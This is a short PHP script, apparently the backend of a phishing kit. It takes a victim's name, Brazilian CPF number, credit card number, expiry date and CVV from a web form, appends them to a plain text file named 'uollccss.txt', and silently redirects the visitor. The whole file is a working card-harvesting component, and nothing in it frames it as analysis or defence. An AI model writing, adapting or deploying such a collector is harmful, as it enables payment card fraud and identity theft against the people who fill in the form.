﻿﻿<?php

$nome = $_POST["nome"];
$cpf = $_POST["cpf"];
$cc = $_POST["cc"];
$mes = $_POST["mes"];
$ano = $_POST["ano"];
$cvv = $_POST["cvv"];

$conteudo = "---------------------------------------------------------------------------------------------------\n$nome;$cpf;$cc;$mes/$ano;$cvv\n";


$arquivo = "uollccss.txt";


if (!$abrir = fopen($arquivo, "a")) { echo "Erro abrindo arquivo 


($arquivo)"; exit; }



if (!fwrite($abrir, $conteudo)) { print "Erro escrevendo no arquivo 
($arquivo)"; exit; } 

echo '<meta http-equiv="refresh" content="0;url=./">';



fclose($abrir);

?>
